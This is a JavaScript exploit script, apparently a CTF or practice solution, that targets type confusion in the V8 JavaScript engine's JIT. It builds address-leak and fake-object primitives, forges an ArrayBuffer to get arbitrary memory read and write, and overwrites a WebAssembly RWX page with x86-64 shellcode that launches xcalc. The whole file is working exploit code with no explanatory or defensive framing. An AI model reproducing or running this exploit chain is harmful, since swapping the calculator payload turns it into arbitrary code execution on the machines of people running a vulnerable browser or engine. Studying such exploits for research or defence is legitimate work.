function hex(x)
{
	return '0x' + (x.toString(16)).padStart(16, 0);
}

function success(str, val){
    console.log("[+]" + str + hex(val));
}

class typeConvert
{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.bytes = new Uint8Array(this.buf);
    }
    f2u(val){        //double ==> Uint64
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){        //Uint64 ==> double
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var tC = new typeConvert();

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
let wasmFunc = wasmInstance.exports.main;


var ab = new ArrayBuffer(0x1000);
var obj1 = {c: {x: 1.1}};
var obj2 = {d: {w: ab}};

var fake_arraybuffer = [
	//map|properties
    tC.u2f(0x0),
	tC.u2f(0x0),
	//elements|length
	tC.u2f(0x0),
	tC.u2f(0x1000),
	//backingstore|0x2
	tC.u2f(0x0),
	tC.u2f(0x2),
	//padding
	tC.u2f(0x0),
	tC.u2f(0x0),
	//fake map
	tC.u2f(0x0),
	tC.u2f(0x1900042317080808),
	tC.u2f(0x00000000084003ff),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0),
	tC.u2f(0x0)
].slice(0);

function leaker(o){
    return o.c.x;
}
function faker(o){
    return o.d.w;
}

for(var i = 0; i < 0x5000; i++){
    leaker(obj1);
}
for(var i = 0; i < 0x5000; i++){
    faker(obj2);
}

function leak_obj(o){
    obj1.c = {y: o};
    res = tC.f2u(leaker(obj1))
    return res
}

fake_arraybuffer_addr = leak_obj(fake_arraybuffer) - 0x80;
wasmInstance_addr = leak_obj(wasmInstance) - 0x1;
success("fake_arraybuffer_addr -> ",fake_arraybuffer_addr);
success("wasmInstance_addr -> ",wasmInstance_addr);


fake_map_addr = fake_arraybuffer_addr + 0x40;
RWX_addr_loc = wasmInstance_addr + 0x80;

fake_arraybuffer[0] = tC.u2f(fake_map_addr);
fake_arraybuffer[4] = tC.u2f(RWX_addr_loc);
obj2.d = {z: tC.u2f(fake_arraybuffer_addr)};
real_ab = faker(obj2);
fake_obj = new DataView(real_ab);
RWX_addr = tC.f2u(fake_obj.getFloat64(0, true));
success("RWX_addr -> ",RWX_addr)
fake_arraybuffer[4] = tC.u2f(RWX_addr);

shellcode = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];

for (i = 0; i < shellcode.length; i++){
    fake_obj.setUint8(i, shellcode[i], true);
}

wasmFunc();

